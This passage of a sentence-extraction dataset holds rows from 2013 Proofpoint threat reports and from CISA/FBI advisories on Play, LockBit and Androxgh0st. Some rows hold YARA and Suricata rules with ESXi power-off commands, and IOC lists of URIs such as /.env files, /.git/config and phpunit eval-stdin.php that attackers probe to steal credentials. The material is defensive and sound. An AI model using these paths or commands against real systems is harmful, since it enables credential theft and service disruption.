CAND_00187,R004,6,R004_P0001,R004_S000077,Recall October’s spam volumes numbers had increased 47.37% since January.
CAND_00188,R004,6,R004_P0001,R004_S000078,With the latest data the increase is a single digit 6%.
CAND_00189,R004,6,R004_P0001,R004_S000079,Perhaps this portends a larger market shift from standard spam to more lucrative malicious attacks such as long- lining.
CAND_00190,R004,6,R004_P0002,R004_S000080,Spam Sources by Country The Top 5 spam sources shifted in November.
CAND_00191,R004,6,R004_P0002,R004_S000081,The European Union continues to be the number one spam generating region in the world and it was the only consistent rank in November.
CAND_00192,R004,6,R004_P0002,R004_S000082,China jumped to second from fifth.
CAND_00193,R004,6,R004_P0002,R004_S000084,"Japan entered the fray to take fourth, marking the first time Japan has ranked in the top spots."
CAND_00194,R004,6,R004_P0002,R004_S000085,India shifted down to fifth.
CAND_00195,R004,6,R004_P0002,R004_S000086,The following table shows the Top 5 spam sending countries for the last six months.
CAND_00196,R004,7,R004_P0002,R004_S000088,"THREAT REPORT ©2013 Proofpoint, Inc."
CAND_00197,R004,7,R004_P0002,R004_S000091,"The European Union recorded a month over month decrease, but continues to generate most of the world’s spam."
CAND_00198,R004,7,R004_P0002,R004_S000092,China increased its spam output 300+ percent in November to just over 12% of the recorded volume.
CAND_00199,R004,7,R004_P0002,R004_S000093,October 2013 November 2013 1 EU 18.69% 1 EU 13.97% 2 USA 6.68% 2 China 12.22% 3 India 4.09% 3 US 7.26% 4 Argentina 3.93% 4 Japan 3.37% 5 China 3.68% 5 India 3.33%
CAND_00200,R004,7,R004_P0004,R004_S000096,"892 Ross Drive, Sunnyvale, CA 94089 Tel: +1 408 517 4710 www.proofpoint.com"
CAND_00201,R005,1,R005_P0003,R005_S000004,This month we turn our focus back to specific threat models.
CAND_00202,R005,1,R005_P0003,R005_S000006,"One method is to send links directly to the malware, almost always packed inside a zip file, and convince the user to run the file manually."
CAND_00203,R005,1,R005_P0003,R005_S000007,"While this has a lower infection rate than drive-by download attacks, it involves none of the complex infrastructure required for a successful exploit kit campaign."
CAND_00204,R005,1,R005_P0003,R005_S000008,One way attackers are keeping things simple is by using Dropbox to host the malware.
CAND_00205,R005,1,R005_P0003,R005_S000011,"An example campaign, clearly targeting Brazilian users, used this lure:"
CAND_00206,R005,1,R005_P0004,R005_S000012,Proofpoint Threat Report
CAND_00207,R005,2,R005_P0001,R005_S000014,"Proofpoint is a trademark of Proofpoint, Inc."
CAND_00208,R005,2,R005_P0001,R005_S000015,THREAT REPORT [2]
CAND_00209,R005,2,R005_P0002,R005_S000016,"All the links in the email are spoofed, and instead of leading to the legitimate Brazilian government sites, clicks are sent to a Dropbox hosted piece of malware."
CAND_00210,R005,2,R005_P0002,R005_S000017,One of the Dropbox URLs in this case was: https://dl.dropboxusercontent.com/XXXX/XXXXXXXXX/nfe.fazenda.gov.br-N-007.874-12-2013.zip.
CAND_00211,R005,2,R005_P0002,R005_S000019,"Some sandboxes are completely blind to this malware, as most cannot decrypt the SSL traffic."
CAND_00212,R005,2,R005_P0002,R005_S000021,"To make things more interesting, the malware in this campaign downloads three (3) additional pieces of malware, all of which are encrypted with some form of custom encryption, further cloaking their presence."
CAND_00213,R005,2,R005_P0002,R005_S000024,Match the Hatch Fly fishing aficionados recognize the wisdom in the phrase “Match the Hatch”.
CAND_00214,R005,2,R005_P0002,R005_S000025,"It refers to matching the fly with the height of an insect hatch, increasing one’s catch."
CAND_00215,R005,2,R005_P0002,R005_S000027,There was a substantial difference in the number of clicks between the two days.
CAND_00216,R005,3,R005_P0001,R005_S000030,"Proofpoint is a trademark of Proofpoint, Inc."
CAND_00217,R005,3,R005_P0001,R005_S000031,THREAT REPORT [3]
CAND_00218,R005,3,R005_P0002,R005_S000036,Threat News Phishing Emails Using Google Docs Lures The SANS Institutes ISC (Internet Storm Center) issued a warning on a scam using Google Docs as the phishing bait.
CAND_00219,R005,3,R005_P0002,R005_S000038,Details can be found here: http://www.spamfighter.com/News-18688-ISC-Warns- Phishing-Emails-Abusing-Google-Docs-Circulating-on-Internet.htm What Can You Learn from Others Data Breaches?
CAND_00220,R005,3,R005_P0002,R005_S000040,Keeping systems patched is paramount.
CAND_00221,R005,4,R005_P0001,R005_S000047,"Commtouch finds 343,972 new malicious websites in November Proofpoint partner Commtouch, specifically their Security Lab, uncovered 343,972 new malicious websites in November."
CAND_00222,R005,4,R005_P0001,R005_S000050,Subscribe to Threat Insight and join the conversation at http://www.proofpoint.com/threatinsight.
CAND_00223,R005,4,R005_P0001,R005_S000052,"The reason this campaign stood out is due to its use of the Nuclear Exploit Kit, a GeoIP database to do some interesting customizations and some variance in the way the user machine was attacked."
CAND_00224,R005,4,R005_P0001,R005_S000053,"Full post is found here, http://www.proofpoint.com/threatinsight/posts/malware-campaign-that-says- whatsapp-goes-nuclear.php Holiday shopping season = more threat campaigns, but will users click?"
CAND_00225,R005,4,R005_P0001,R005_S000056,"Full details are here, http://www.proofpoint.com/threatinsight/posts/holiday-shopping-season-equal- more-threat-campaigns-but-will-users-click.php"
CAND_00226,R005,5,R005_P0001,R005_S000058,"Proofpoint is a trademark of Proofpoint, Inc."
CAND_00227,R005,5,R005_P0001,R005_S000059,"THREAT REPORT [5] Healthcare reform also driving up watering hole attacks As year-end nears, and Obamacare takes effect, Proofpoint systems have observed a number of compromised websites related to health care topics serving up malware."
CAND_00228,R005,5,R005_P0001,R005_S000060,"Our research team looked through the last 90 days of all the millions of URLs we have found to be malicious in our sandbox, and extracted the ones that seemed related to healthcare."
CAND_00229,R005,5,R005_P0001,R005_S000061,"We then removed the domains that were abused as part of spam campaigns, or were blatant SEO websites, leaving only those we could confirm were serving up malware directly in a watering hole-style attack."
CAND_00230,R005,5,R005_P0001,R005_S000062,"We were left with 43 domains, all of which we observed serving up malware in the last 90 days."
CAND_00231,R005,5,R005_P0001,R005_S000063,Websites with domains like “accesshealthsystems.com” and “advancemedicals.com” feature among these.
CAND_00232,R005,5,R005_P0001,R005_S000065,The volumes historically track with that of our customer base.
CAND_00233,R005,5,R005_P0001,R005_S000066,Daily spam volumes dropped significantly from October to November.
CAND_00234,R005,5,R005_P0001,R005_S000067,"We again saw volumes across a wide range, from just below 10 million to just above 3 million."
CAND_00235,R005,5,R005_P0001,R005_S000068,Volumes peaked at the beginning of the month but saw a substantial trough during the middle of the month.
CAND_00236,R005,6,R005_P0001,R005_S000072,"©2013 Proofpoint, Inc."
CAND_00237,R005,6,R005_P0001,R005_S000074,THREAT REPORT [6] Spam volumes decreased again month over month in November by a substantial 38.17%.
CAND_00238,R005,6,R005_P0001,R005_S000075,A third straight monthly decrease in volumes and a 58.53% decrease over three months.
CAND_00239,R005,6,R005_P0001,R005_S000076,This downward trend has given back most of the previously reported increase.
CAND_00240,R005,6,R005_P0001,R005_S000079,Perhaps this portends a larger market shift from standard spam to more lucrative malicious attacks such as long- lining.
CAND_00241,R005,6,R005_P0002,R005_S000080,Spam Sources by Country The Top 5 spam sources shifted in November.
CAND_00242,R005,6,R005_P0002,R005_S000081,The European Union continues to be the number one spam generating region in the world and it was the only consistent rank in November.
CAND_00243,R005,6,R005_P0002,R005_S000082,China jumped to second from fifth.
CAND_00244,R005,6,R005_P0002,R005_S000083,The United States dropped to number three.
CAND_00245,R005,6,R005_P0002,R005_S000086,The following table shows the Top 5 spam sending countries for the last six months.
CAND_00246,R005,7,R005_P0002,R005_S000089,"Proofpoint is a trademark of Proofpoint, Inc."
CAND_00247,R005,7,R005_P0002,R005_S000091,"The European Union recorded a month over month decrease, but continues to generate most of the world’s spam."
CAND_00248,R005,7,R005_P0002,R005_S000092,China increased its spam output 300+ percent in November to just over 12% of the recorded volume.
CAND_00249,R005,7,R005_P0004,R005_S000095,"Proofpoint, Inc."
CAND_00250,R005,7,R005_P0004,R005_S000096,"892 Ross Drive, Sunnyvale, CA 94089 Tel: +1 408 517 4710 www.proofpoint.com"
CAND_00251,R006,1,R006_P0001,R006_S000002,"When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact."
CAND_00252,R006,1,R006_P0002,R006_S000011,Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
CAND_00253,R006,1,R006_P0002,R006_S000012,"Note: Updates to this advisory, originally published December 18, 2023, include: ▪ June 4, 2025: The advisory was updated to reflect new TTPs employed by Play ransomware group, as well as provide current IOCs/remove outdated IOCs for effective threat hunting."
CAND_00254,R006,1,R006_P0002,R006_S000014,"End Update Since June 2022, the Play (also known as Playcrypt) ransomware group has impacted a wide range of businesses and critical infrastructure in North America, South America, and Europe."
CAND_00255,R006,1,R006_P0002,R006_S000016,Organizations should take the following actions today to mitigate cyber threats from Play ransomware: ▪ Prioritize remediating known exploited vulnerabilities.
CAND_00256,R006,1,R006_P0002,R006_S000017,"▪ Enable multifactor authentication (MFA) for all services to the extent possible, particularly for webmail, VPN, and accounts that access critical systems."
CAND_00257,R006,1,R006_P0002,R006_S000018,"June 4, 2025"
CAND_00258,R006,2,R006_P0001,R006_S000019,TLP:CLEAR FBI | CISA | ACSC Page 2 of 18 | Product ID: AA23-352A TLP:CLEAR ▪ Regularly patch and update software and applications to their latest versions and conduct regular vulnerability assessments.
CAND_00259,R006,2,R006_P0001,R006_S000029,"For a downloadable copy of IOCs, see: ▪ AA23-352A STIX XML (JUN 2025) (XML, 51.10 KB) ▪ AA23-352A STIX JSON (JUN 2025) (JSON, 31.62 KB)"
CAND_00260,R006,3,R006_P0001,R006_S000035,"Update June 4, 2025: Multiple ransomware groups, including initial access brokers with ties to Play ransomware operators, exploited CVE-2024-57727 in remote monitoring and management (RMM) tool SimpleHelp [T1190] to conduct remote code execution [T1059.001] at many U.S.-based entities following the vulnerabilities’ disclosure on 16 January 2025."
CAND_00261,R006,3,R006_P0001,R006_S000036,"End Update Discovery and Defense Evasion Play ransomware actors use tools like AdFind to run Active Directory queries [TA0007] and Grixba,1 an information-stealer, to enumerate network information [T1016] and scan for anti-virus software [T1518.001]."
CAND_00262,R006,3,R006_P0001,R006_S000043,End Update Play ransomware actors often split compromised data into segments and use tools like WinRAR to compress files [T1560.001] into .RAR format for exfiltration.
CAND_00263,R006,3,R006_P0001,R006_S000044,The actors then use WinSCP to transfer data [T1048] from a compromised network to actor-controlled accounts.
CAND_00264,R006,4,R006_P0001,R006_S000049,The ransom note directs victims to contact the Play ransomware group at an email address ending in @gmx[.]de or @web[.]de.
CAND_00265,R006,4,R006_P0001,R006_S000055,"The ransomware binary supports command line arguments; however, if no command line arguments are passed, the malware powers off all VMs and encrypts files related to VMs using randomly generated per-file keys."
CAND_00266,R006,4,R006_P0001,R006_S000059,"Like the Windows variant of Play ransomware, the ESXi variant must be recompiled for each campaign."
CAND_00267,R006,5,R006_P0001,R006_S000066,Tools Leveraged by Play Ransomware Actors Name Description AdFind Used to query and retrieve information from Active Directory.
CAND_00268,R006,5,R006_P0001,R006_S000068,GMER A software tool intended to be used for detecting and removing rootkits.
CAND_00269,R006,5,R006_P0001,R006_S000076,Mimikatz Allows users to view and save authentication credentials such as Kerberos tickets.
CAND_00270,R006,5,R006_P0001,R006_S000077,Play ransomware actors have used it to add accounts to domain controllers.
CAND_00271,R006,5,R006_P0001,R006_S000078,WinPEAS Used to search for additional privilege escalation paths.
CAND_00272,R006,5,R006_P0001,R006_S000082,Microsoft Nltest Used by Play ransomware actors for network discovery.
CAND_00273,R006,6,R006_P0001,R006_S000087,Table 2.
CAND_00274,R006,6,R006_P0001,R006_S000088,Hashes Associated with Play Ransomware Actors Hashes (SHA 256 and SHA 1) Description 47B7B2DD88959CD7224A5542AE8D5BCE928BFC986BF0D03215 32A7515C244A1E SVCHost.dll Backdoor 75B525B220169F07AECFB3B1991702FBD9A1E170CAF0040D1F CB07C3E819F54A 453257C3494ADDAFB39CB6815862403E827947A1E7737EB816 8CD10522465DEB C59F3C8D61D940B56436C14BC148C1FE98862921B8F7BAD97F BC96B31D71193C GRIXBA Gt_net.exe Custom data gathering tool 1409E010675BF4A40DB0A845B60DB3AAE5B302834E80ADEEC8 84AEBC55ECCBF7 PSexesvc.exe Custom Play “psexesvc” 0E408AED1ACF902A9F97ABF71CF0DD354024109C5D52A79054 C421BE35D93549 HRsword.exe Disables endpoint protection
CAND_00275,R006,8,R006_P0001,R006_S000094,"External Remote Services T1133 Play ransomware actors have used remote access services, such as RDP/VPN connection to gain initial access."
CAND_00276,R006,9,R006_P0001,R006_S000099,Software Discovery: Security Software Discovery T1518.001 Play ransomware actors scan for antivirus software.
CAND_00277,R006,9,R006_P0001,R006_S000102,Indicator Removal: Clear Windows Event Logs T1070.001 Play ransomware actors delete logs or other indicators of compromise to hide intrusion activity.
CAND_00278,R006,9,R006_P0001,R006_S000106,Table 7.
CAND_00279,R006,10,R006_P0001,R006_S000111,Play ATT&CK Techniques for Enterprise for Collection Technique Title ID Use Archive Collected Data: Archive via Utility T1560.001 Play ransomware actors use tools like WinRAR to compress files.
CAND_00280,R006,10,R006_P0001,R006_S000115,Play ATT&CK Techniques for Enterprise for Impact Technique Title ID Use Data Encrypted for Impact T1486 Play ransomware actors encrypt data on target systems to interrupt availability to system and network resources.
CAND_00281,R006,11,R006_P0001,R006_S000118,"TLP:CLEAR FBI | CISA | ACSC Page 11 of 18 | Product ID: AA23-352A TLP:CLEAR $stop_list_mode_str = ""stop list mode"" $hosts_in_exclusion_str = ""hosts in exclusion:"" $error_in_stop_list_str = ""Error, check stop list file, exit."" $complete_str = ""Complete."" $dev_urandom_path_str = ""/dev/urandom"" $targeted_ext_vmdk = "".vmdk"" fullword $targeted_ext_vmem = "".vmem"" fullword $targeted_ext_vmsd = "".vmsd"" fullword $targeted_ext_vmsn = "".vmsn"" fullword $targeted_ext_vmx = "".vmx"" fullword $targeted_ext_vmxf = "".vmxf"" fullword $targeted_ext_vswp = "".vswp"" fullword $targeted_ext_vmss = "".vmss"" fullword $targeted_ext_nvram = "".nvram"" fullword $targeted_ext_vmtx = "".vmtx"" fullword $targeted_ext_log = "".log"" fullword $vim_cmd_power_off_vms_str = ""vim-cmd vmsvc/power.off"" $get_storage_shell_cmd_str = ""esxcli storage filesystem list > storage"" $get_machines_shell_cmd_str = ""vim-cmd vmsvc/getallvms > machines"" condition: all of them } Below are copies of YARA and Suricata rules related to Play’s custom data gathering tool, Grixba: rule GRXBA { meta: description = ""Detects the infostealer GRXBA version 1.1.3.0"" date = ""2025-01"" filetype = ""pe"""
CAND_00282,R006,12,R006_P0002,R006_S000120,"condition: all of them } Rule Suricataalert smb any any -> any any (noalert; content:""|55 00 73 00 65 00 72 00 73 00 5c 00 41 00 6c 00 6c 00 20 00 55 00 73 00 65 00 72 00 73 00 5c 00 41 00 70 00 70 00 44 00 61 00 74 00 61 00 5c 00 4c 00 6f 00 63 00 61 00 6c 00 5c 00 4d 00 69 00 63 00 72 00 6f 00 73 00 6f 00 66 00 74 00 5c 00 57 00 69 00 6e 00 64 00 6f 00 77 00 73 00 5c 00 57 00 65 00 62 00 43 00 61 00 63 00 68 00 65 00|""; flow:to_server; flowbits:set,GRXBA_webhist_path_1_detected ;sid:1900002; rev:1;) alert smb any any -> any any (noalert; content:""|55 00 73 00 65 00 72 00 73 00 5c 00 41 00 6c 00 6c 00 20 00 55 00 73 00 65 00 72 00 73 00 5c 00 41 00 70 00 70 00 44 00 61 00 74 00 61 00 5c 00 52 00 6f 00 61 00 6d 00 69 00 6e 00 67 00 5c 00 4d 00 6f 00 6f 00 6e 00 63 00 68 00 69 00 6c 00 64 00 20 00 50 00 72 00 6f 00 64 00"
CAND_00283,R006,14,R006_P0001,R006_S000126,"Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections."
CAND_00284,R006,15,R006_P0001,R006_S000131,"▪ Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST’s standards for developing and managing password policies [CPG 2.C]."
CAND_00285,R006,15,R006_P0001,R006_S000139,"If unable to patch, then disable Outlook Web Access (OWA) until updates are able to be undertaken.6 ▪ Segment networks [CPG 2.F] to prevent the spread of ransomware."
CAND_00286,R006,15,R006_P0001,R006_S000143,▪ Filter network traffic by preventing unknown or untrusted origins from accessing remote services on internal systems.
CAND_00287,R006,15,R006_P0001,R006_S000146,"▪ Install, regularly update, and enable real time detection for antivirus software on all hosts."
CAND_00288,R006,16,R006_P0001,R006_S000151,▪ Disable hyperlinks in received emails.
CAND_00289,R006,16,R006_P0001,R006_S000152,▪ Implement time-based access for accounts set at the admin level and higher.
CAND_00290,R006,16,R006_P0001,R006_S000158,"If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally [CPG 2.E]."
CAND_00291,R006,16,R006_P0001,R006_S000159,▪ Maintain offline backups of data and regularly maintain backup and restoration [CPG 2.R].
CAND_00292,R006,16,R006_P0001,R006_S000160,"By instituting this practice, an organization ensures they will not be severely interrupted, and/or only have irretrievable data."
CAND_00293,R006,16,R006_P0001,R006_S000168,3.
CAND_00294,R006,16,R006_P0001,R006_S000169,Test your technologies against this technique.
CAND_00295,R006,16,R006_P0001,R006_S000170,4.
CAND_00296,R006,16,R006_P0001,R006_S000171,Analyze your detection and prevention technologies performance.
CAND_00297,R006,17,R006_P0001,R006_S000182,"Regardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge you to promptly report ransomware incidents to a local FBI Field Office, FBI’s Internet Crime Complaint Center (IC3), or CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870)."
CAND_00298,R006,17,R006_P0002,R006_S000188,"1 Threat Hunter Team, “Play Ransomware Group Using New Custom Data-Gathering Tools,” Symantec Enterprise Blogs, Symantec, April 19, 2023, https://www.security.com/threat-intelligence/play-ransomware-volume-shadow- copy."
CAND_00299,R006,17,R006_P0002,R006_S000189,"2 Trend Micro Research, “Play,” Trend Micro, July 21, 2023, https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-play."
CAND_00300,R006,18,R006_P0002,R006_S000192,5 See also Protect Yourself: Multi-Factor Authentication – Cyber.gov.au.
CAND_00301,R007,1,R007_P0003,R007_S000007,LockBit
CAND_00302,R007,2,R007_P0002,R007_S000014,"Due to the large number of unconnected affiliates in the operation, LockBit ransomware attacks vary significantly in observed tactics, techniques, and procedures (TTPs)."
CAND_00303,R007,3,R007_P0002,R007_S000019,2 Technical Details .................................................................................................................................
CAND_00304,R007,3,R007_P0002,R007_S000037,25 Implement Mitigations for Defense-in-Depth ..................................................................................
CAND_00305,R007,4,R007_P0002,R007_S000047,"In 2022, LockBit was the most active global ransomware group and RaaS provider in terms of the number of victims claimed on their data leak site."
CAND_00306,R007,4,R007_P0002,R007_S000055,"Table 1: Evolution of LockBit RaaS Date Event September 2019 First observed activity of ABCD ransomware, the predecessor to LockBit."
CAND_00307,R007,5,R007_P0002,R007_S000060,September 2022 Non-LockBit affiliates able to use LockBit 3.0 after its builder was leaked.
CAND_00308,R007,5,R007_P0002,R007_S000062,"[7] April 2023 LockBit ransomware encryptors targeting macOS seen on VirusTotal [8, 9]"
CAND_00309,R007,5,R007_P0003,R007_S000064,"LockBit Statistics Percentage of ransomware incidents attributed to LockBit: • Australia: From April 1, 2022, to March 31, 2023, LockBit made up 18% of total reported Australian ransomware incidents."
CAND_00310,R007,8,R007_P0003,R007_S000107,"When repurposed by LockBit, these tools are then used for a range of malicious cyber activity, such as network reconnaissance, remote access and tunneling, credential dumping, and file exfiltration."
CAND_00311,R007,8,R007_P0003,R007_S000108,"Use of PowerShell and batch scripts are observed across most intrusions, which focus on system discovery, reconnaissance, password/credential hunting, and privilege escalation."
CAND_00312,R007,9,R007_P0002,R007_S000117,"Gathers AD information used to exploit a victim’s network, escalate privileges, and facilitate lateral movement."
CAND_00313,R007,10,R007_P0002,R007_S000128,Enables remote control of victim’s network devices.
CAND_00314,R007,10,R007_P0002,R007_S000129,T1219 Remote Access Software Backstab Terminates antimalware-protected processes.
CAND_00315,R007,11,R007_P0002,R007_S000139,Enables LockBit affiliate actors to bypass Microsoft Defender.
CAND_00316,R007,11,R007_P0002,R007_S000148,T1562.001 Impair Defenses: Disable or Modify Tools Impacket Collection of Python classes for working with network protocols.
CAND_00317,R007,13,R007_P0003,R007_S000182,T1082 System Information Discovery ScreenConnect (also known as ConnectWise) Enables remote connections to network devices for management.
CAND_00318,R007,13,R007_P0003,R007_S000187,Enables LockBit affiliate actors to remotely connect to systems over Remote Desktop Protocol (RDP).
CAND_00319,R007,14,R007_P0002,R007_S000196,Enables data exfiltration via the SSH File Transfer Protocol.
CAND_00320,R007,16,R007_P0002,R007_S000212,International Partnership TLP:CLEAR Page 16 of 30 | Product ID: AA23-165A TLP:CLEAR Technique Title ID Use System Services: Service Execution T1569.002 LockBit 3.0 uses PsExec to execute commands or payloads.
CAND_00321,R007,17,R007_P0002,R007_S000220,International Partnership TLP:CLEAR Page 17 of 30 | Product ID: AA23-165A TLP:CLEAR Table 9: LockBit Affiliates’ ATT&CK Techniques for Enterprise – Defense Evasion Technique Title ID Use Execution Guardrails: Environmental Keying T1480.001 LockBit 3.0 will only decrypt the main component or continue to decrypt and/or decompress data if the correct password is entered.
CAND_00322,R007,17,R007_P0003,R007_S000222,LockBit 3.0 affiliates use Bat Armor to bypass the PowerShell execution Policy.
CAND_00323,R007,17,R007_P0005,R007_S000225,Indicator Removal: Clear Windows Event Logs T1070.001
CAND_00324,R007,19,R007_P0002,R007_S000242,Remote Services: Server Message Block (SMB)/Admin Windows Shares T1021.002 LockBit affiliates may use Cobalt Strike and target SMB shares for lateral movement.
CAND_00325,R007,21,R007_P0002,R007_S000255,"International Partnership TLP:CLEAR Page 21 of 30 | Product ID: AA23-165A TLP:CLEAR Technique Title ID Use Defacement: Internal Defacement T1491.001 LockBit 3.0 changes the host system’s wallpaper and icons to the LockBit 3.0 wallpaper and icons, respectively."
CAND_00326,R007,21,R007_P0002,R007_S000265,"For example, account use polices are mitigations for initial access, persistence, privilege escalation, and credential access but would be listed under initial access mitigations."
CAND_00327,R007,21,R007_P0002,R007_S000269,"o Enforce use of longer passwords consisting of at least 15 characters in length [CPG 2.B, 2.C]."
CAND_00328,R007,21,R007_P0002,R007_S000270,o Store passwords in a salted and hashed format using industry-recognized password hashing algorithms.
CAND_00329,R007,22,R007_P0002,R007_S000281,Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to— various subnetworks and by restricting adversary lateral movement.
CAND_00330,R007,22,R007_P0002,R007_S000291,Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats.
CAND_00331,R007,22,R007_P0002,R007_S000294,Organizations should patch vulnerable software and hardware systems within 24 to 48 hours from when a vulnerability is disclosed.
CAND_00332,R007,22,R007_P0002,R007_S000297,"Configure group policy to Deny log on locally, Deny log on through Terminal Services, and Deny access to this computer from the network for all service accounts to limit the ability for compromised service accounts to be used for lateral movement."
CAND_00333,R007,22,R007_P0002,R007_S000298,"• Block direct internet access for administration interfaces (e.g., application protocol interface (API)) and for remote access."
CAND_00334,R007,23,R007_P0002,R007_S000312,• Control and restrict network connections accordingly with a network flow matrix.
CAND_00335,R007,23,R007_P0002,R007_S000315,"o Ensure PowerShell instances are configured to use the latest version, and have module, script block, and transcription logging enabled (enhanced logging)."
CAND_00336,R007,23,R007_P0002,R007_S000317,It is recommended to turn on these two Windows Event Logs with a retention period of at least 180 days.
CAND_00337,R007,24,R007_P0002,R007_S000324,• Enable Credential Guard to protect your Windows system credentials.
CAND_00338,R007,24,R007_P0002,R007_S000327,Be aware that enabling this security control has some downsides.
CAND_00339,R007,24,R007_P0002,R007_S000331,"Defense Evasion • Apply local security policies to control application execution (e.g., Software Restriction Policies (SRP), AppLocker, Windows Defender Application Control (WDAC)) with a strict allowlist."
CAND_00340,R007,24,R007_P0002,R007_S000341,"To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral"
CAND_00341,R007,25,R007_P0002,R007_S000345,• VPN access should not be considered as a trusted network zone.
CAND_00342,R007,25,R007_P0002,R007_S000347,Exfiltration • Block connections to known malicious systems by using a Transport Layer Security (TLS) Proxy.
CAND_00343,R007,25,R007_P0002,R007_S000349,"By using feeds for known malicious systems, the establishment of a connection to a C2 server can be prevented."
CAND_00344,R007,25,R007_P0002,R007_S000357,"CERT NZ explains How ransomware happens and how to stop it by applying mitigations, or critical controls, to provide a stronger defense to detect, prevent, and respond to ransomware before an organization’s data is encrypted."
CAND_00345,R007,26,R007_P0002,R007_S000361,• Impact on Target where the actor is able to steal and encrypt data and then demand ransom.
CAND_00346,R007,26,R007_P0002,R007_S000364,"In the Consolidation and Preparation phase, mitigations working together to keep an attacker from accessing network devices are patching devices, using network segmentation, enforcing the principle of least privilege, implementing MFA, and using logging and alerting."
CAND_00347,R007,27,R007_P0002,R007_S000368,To get started: 1.
CAND_00348,R007,27,R007_P0002,R007_S000372,3.
CAND_00349,R007,28,R007_P0002,R007_S000385,"International Partnership TLP:CLEAR Page 28 of 30 | Product ID: AA23-165A TLP:CLEAR ransomware incidents through best practices to detect, prevent, respond, and recover, including step-by-step approaches to address potential attacks."
CAND_00350,R007,28,R007_P0002,R007_S000391,"• BSI: o See BSI’s Ransomware – Facts and Defense Strategies for a comprehensive collection of resources on ransomware prevention, detection, and reaction."
CAND_00351,R008,1,R008_P0002,R008_S000001,"To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at fbi.gov/contact-us/field-offices."
CAND_00352,R008,1,R008_P0002,R008_S000002,"When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact."
CAND_00353,R008,1,R008_P0002,R008_S000008,"For more information on the Traffic Light Protocol, see cisa.gov/tlp/."
CAND_00354,R008,1,R008_P0002,R008_S000011,The FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of cybersecurity incidents caused by Androxgh0st infections.
CAND_00355,R008,1,R008_P0002,R008_S000015,• Review and ensure only necessary servers and services are exposed to the internet.
CAND_00356,R008,2,R008_P0002,R008_S000017,"FBI | CISA Page 2 of 13 | Product ID: AA24-016A TLP:CLEAR TLP:CLEAR For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool."
CAND_00357,R008,2,R008_P0002,R008_S000020,"Androxgh0st malware also supports numerous functions capable of abusing the Simple Mail Transfer Protocol (SMTP), such as scanning [T1046] and exploiting exposed credentials [T1078] and application programming interfaces (APIs) [T1114], and web shell deployment [T1505.003]."
CAND_00358,R008,2,R008_P0002,R008_S000021,"Targeting the PHPUnit Androxgh0st malware TTPs commonly involves the use of scripts, conducting scanning [T1595] and searching for websites with specific vulnerabilities."
CAND_00359,R008,2,R008_P0002,R008_S000025,Malicious actors likely use Androxgh0st to download malicious files [T1105] to the system hosting the website.
CAND_00360,R008,2,R008_P0002,R008_S000027,This allows threat actors to download additional malicious files for their operations and access databases.
CAND_00361,R008,2,R008_P0002,R008_S000028,Laravel Framework Targeting Androxgh0st malware establishes a botnet to scan for websites using the Laravel web application framework.
CAND_00362,R008,2,R008_P0002,R008_S000033,"Alternatively, Androxgh0st may issue a POST request to the same URI with a POST variable named 0x[] containing certain data sent to the web server."
CAND_00363,R008,2,R008_P0002,R008_S000035,"This method appears to be used for websites in debug mode (i.e., when non-production websites are exposed to the internet)."
CAND_00364,R008,3,R008_P0002,R008_S000037,FBI | CISA Page 3 of 13 | Product ID: AA24-016A TLP:CLEAR TLP:CLEAR Androxgh0st malware can also access the application key [TA0006] for the Laravel application on the website.
CAND_00365,R008,3,R008_P0002,R008_S000039,"The encrypted code is then passed to the website as a value in the cross-site forgery request (XSRF) token cookie, XSRF-TOKEN, and included in a future GET request to the website."
CAND_00366,R008,3,R008_P0002,R008_S000041,"In doing so, the threat actors can upload files to the website via remote access."
CAND_00367,R008,3,R008_P0002,R008_S000046,"For example, when threat actors successfully identify and compromise AWS credentials from a vulnerable website, they have been observed attempting to create new users and user policies [T1136]."
CAND_00368,R008,3,R008_P0002,R008_S000048,"INDICATORS OF COMPROMISE (IOCs) Based on investigations and analysis, the following requests are associated with Androxgh0st activity: • Incoming GET and POST requests to the following URIs: o /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php o /.env • Incoming POST requests with the following strings: o [0x%5B%5D=androxgh0st] o ImmutableMultiDict([('0x[]', 'androxgh0st')]) In both previously listed POST request strings, the name androxgh0st has been observed to be replaced with other monikers."
CAND_00369,R008,3,R008_P0002,R008_S000049,Additional URIs observed by the FBI and a trusted third party used by these threat actors for credential exfiltration include: • /info • /phpinfo • /phpinfo.php • /?phpinfo=1 • /frontend_dev.php/$ • /_profiler/phpinfo
CAND_00370,R008,4,R008_P0002,R008_S000050,"FBI | CISA Page 4 of 13 | Product ID: AA24-016A TLP:CLEAR TLP:CLEAR • /debug/default/view?panel=config • /config.json • /.json • /.git/config • /live_env • /.env.dist • /.env.save • /environments/.env.production • /.env.production.local • /.env.project • /.env.development • /.env.production • /.env.prod • /.env.development.local • /.env.old • /<insert-directory>/.env o Note: the actor may attempt multiple different potential URI endpoints scanning for the .env file, for example /docker/.env or /local/.env."
